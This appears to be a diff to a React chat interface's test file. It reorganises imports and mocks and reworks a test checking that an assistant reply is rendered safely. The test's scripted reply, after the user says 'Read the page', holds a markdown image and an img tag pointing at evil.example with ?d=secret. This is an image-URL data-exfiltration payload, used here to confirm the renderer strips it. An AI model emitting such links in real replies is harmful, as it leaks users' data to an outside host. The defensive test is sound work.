@@ -6,7 +6,8 @@ import { createMemoryHistory, createRootRoute, createRouter, RouterProvider } fr
 import { cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
 import { type ReactNode, useState } from "react";
 import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";
-import { Composer, Thread } from "../src/components/shell/chat.tsx";
+import { Composer } from "../src/components/shell/composer.tsx";
+import { Thread } from "../src/components/shell/thread.tsx";
 import type { ChatMessage, EngineName } from "../src/lib/chat.ts";
 
 // The chat's thread on a scripted conversation (`createChat`) through the real `useChat`: no model,
@@ -16,10 +17,24 @@ import type { ChatMessage, EngineName } from "../src/lib/chat.ts";
 // The server functions, which only Start's build keeps out of a browser module: the thread calls none.
 vi.mock(
   "../src/functions.ts",
-  () => new Proxy({}, { has: () => true, get: (_, name) => (name === "then" ? undefined : vi.fn<() => void>()) }),
+  () =>
+    new Proxy(
+      {},
+      {
+        has: () => true,
+        get: (_, name) =>
+          name === "then"
+            ? undefined
+            : () => {
+                throw new Error(`The thread called ${String(name)}`);
+              },
+      },
+    ),
 );
 
-beforeAll(() => {
+beforeAll(async () => {
+  // The reply's lazy renderer, loaded ahead so no test's wait is spent transforming it.
+  await import("../src/components/shell/markdown.tsx");
   // What jsdom lacks and the message scroller reads.
   for (const name of ["ResizeObserver", "IntersectionObserver"]) {
     vi.stubGlobal(
@@ -97,10 +112,11 @@ describe("the chat's thread", () => {
         .user("Read the page")
         .assistant('Done. ![x](https://evil.example/?d=secret)\n\n<img src="https://evil.example/?d=raw" />'),
     );
-    await screen.findByText(/Done\./);
-    await waitFor(() => expect(screen.getByRole("log").textContent).toContain("Done."));
+    // The turn over, and past the plain text shown until the renderer's chunk comes.
+    await screen.findByRole("button", { name: "Copy" });
+    await waitFor(() => expect(document.documentElement.innerHTML).not.toContain("evil.example"));
     expect(document.querySelector("img")).toBeNull();
-    expect(document.documentElement.innerHTML).not.toContain("evil.example");
+    expect(screen.getByRole("log").textContent).toContain("Done.");
   });
 
   it("draws thinking and steps as one trace, thinking open only while it streams", async () => {
